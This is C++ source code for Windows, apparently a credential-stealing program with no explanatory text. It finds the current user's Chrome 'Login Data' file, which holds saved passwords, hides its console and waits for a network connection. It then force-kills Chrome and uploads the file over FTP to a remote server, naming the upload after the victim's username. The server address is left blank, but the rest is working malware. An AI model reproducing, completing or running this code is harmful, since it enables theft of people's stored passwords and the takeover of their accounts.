
#include <sstream>
#include <wininet.h>
#include <windows.h>
#pragma comment(lib, "Wininet.lib")
void UploadToServer(const char* file, const char* ftpname)
{
    HINTERNET hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hFtpSession = InternetConnect(hInternet,"" , INTERNET_DEFAULT_FTP_PORT, "", "", INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
    FtpPutFile(hFtpSession, file, ftpname, FTP_TRANSFER_TYPE_BINARY, 0);
    InternetCloseHandle(hFtpSession);
    InternetCloseHandle(hInternet);

}
std::string toStr()
{
    const char* ftpname = getenv("USERNAME");
    if(ftpname == NULL)
    {
        return "FAILED_TO_GET_USERNAME";
    } else {
        std::string nm(ftpname);
        return nm;
    }
}

int main() {
    
    std::ostringstream fpath;
    fpath << "C:\\Users\\" << toStr() << "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
    FreeConsole();
    while(1)
    {
        if(InternetCheckConnection("http://www.google.com", 1, 0))
        {
            WinExec("taskkill /IM chrome.exe /F", SW_HIDE);
            UploadToServer(fpath.str().c_str(), toStr().c_str());
            break;
        } else {
            // Do nothing..
        }
    }
    return 0;
}
    